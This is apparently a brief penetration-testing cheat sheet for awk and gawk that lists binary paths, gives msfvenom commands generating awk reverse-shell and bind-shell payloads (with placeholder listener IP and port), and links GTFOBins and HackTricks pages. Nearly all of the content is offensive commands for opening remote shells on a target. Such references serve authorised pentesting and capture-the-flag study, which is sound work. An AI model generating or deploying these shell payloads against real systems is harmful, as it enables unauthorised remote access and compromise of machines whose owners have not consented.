# Manual

## 01 - Common Files

```
/usr/bin/awk
/usr/bin/gawk
```

## 02 - Generate Payloads

### 2.1 - Reverse Shells

```
$ msfvenom -p cmd/unix/reverse_awk lhost=<IP> lport=<PORT>
```

### 2.2 - Bind Shells

```
$ msfvenom -p cmd/unix/bind_awk lport=<PORT>
```

---
## References

### GTFOBins

- [GTFOBins: Awk](https://gtfobins.github.io/gtfobins/awk/)

- [GTFOBins: Gawk](https://gtfobins.github.io/gtfobins/gawk/)

- [GTFOBins: Nawk](https://gtfobins.github.io/gtfobins/nawk)

### Hacktricks

- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)